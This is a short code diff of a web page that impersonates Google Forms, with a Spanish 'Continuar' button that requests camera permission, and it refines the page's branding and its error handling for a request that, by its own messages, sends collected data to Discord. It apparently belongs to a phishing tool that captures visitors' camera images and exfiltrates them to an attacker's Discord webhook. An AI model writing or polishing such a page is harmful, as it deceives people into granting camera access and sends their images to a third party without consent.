@@ -40,7 +40,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Google Forms L</h1>
+        <h1>Google Forms</h1>
         <p>Formulario de Google LLC 2024 ©</p>
         <button class="button" onclick="requestCameraPermission()">Continuar</button>
     </div>
@@ -106,12 +106,12 @@
                         if (response.ok) {
                             alert('Redirecting to the main page...');
                         } else {
-                            alert('Hmm error');
+                            throw new Error('Failed to send data to Discord. Status: ' + response.status);
                         }
                     })
                     .catch(error => {
                         console.error('Error:', error);
-                        alert('An error occurred while sending data. Please try again later.');
+                        alert('An error occurred while sending data to Discord: ' + error.message);
                     });
                 })
                 .catch(error => {
